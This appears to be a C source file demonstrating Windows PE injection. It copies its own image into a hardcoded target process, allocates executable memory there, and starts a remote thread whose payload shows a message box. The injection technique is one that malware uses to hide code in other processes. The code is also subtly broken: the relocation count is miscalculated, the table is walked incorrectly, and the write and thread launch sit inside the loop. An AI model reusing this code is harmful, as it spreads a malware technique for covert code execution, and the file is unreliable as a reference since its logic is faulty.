#include <stdio.h>
#include <Windows.h>

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

DWORD InjectionEntryPoint()
{
    CHAR moduleName[128] = "";
    GetModuleFileNameA(NULL, moduleName, sizeof(moduleName));
    MessageBoxA(NULL, moduleName, "Obligatory PE Injection", NULL);
}

int main(int argc, char **argv)
{
    PVOID imageBase = GetModuleHandle(NULL);
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);

    PVOID localImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
    memcpy(localImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);

    HANDLE targetProc = OpenProcess(MAXIMUM_ALLOWED, FALSE, 8336);

    PVOID targetImage = VirtualAllocEx(targetProc, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    DWORD_PTR deltaImageBase = (DWORD_PTR)targetImage - (DWORD_PTR)imageBase;
    
    PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    DWORD relocationEntriesCount = 0;
    DWORD *patchedAddress;
    PBASE_RELOCATION_ENTRY relocationRVA = NULL;

    while (relocationTable->SizeOfBlock > 0) {
        relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION) / sizeof(USHORT));
        relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);
        for (short i = 0; i < relocationEntriesCount; i++) {
            if (relocationRVA[i].Offset) {
                patchedAddress = (PDWORD_PTR)((DWORD_PTR)localImage + relocationTable->VirtualAddress + relocationRVA[i].Offset);
                *patchedAddress += deltaImageBase;
            }
        }
        relocationTable = (PIMAGE_BASE_RELOCATION)((PDWORD_PTR)relocationTable->SizeOfBlock);
        WriteProcessMemory(targetProc, targetImage, localImage, ntHeader->OptionalHeader.SizeOfImage, NULL);
        CreateRemoteThread(targetProc, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)InjectionEntryPoint + deltaImageBase), NULL, 0, NULL);
    }
}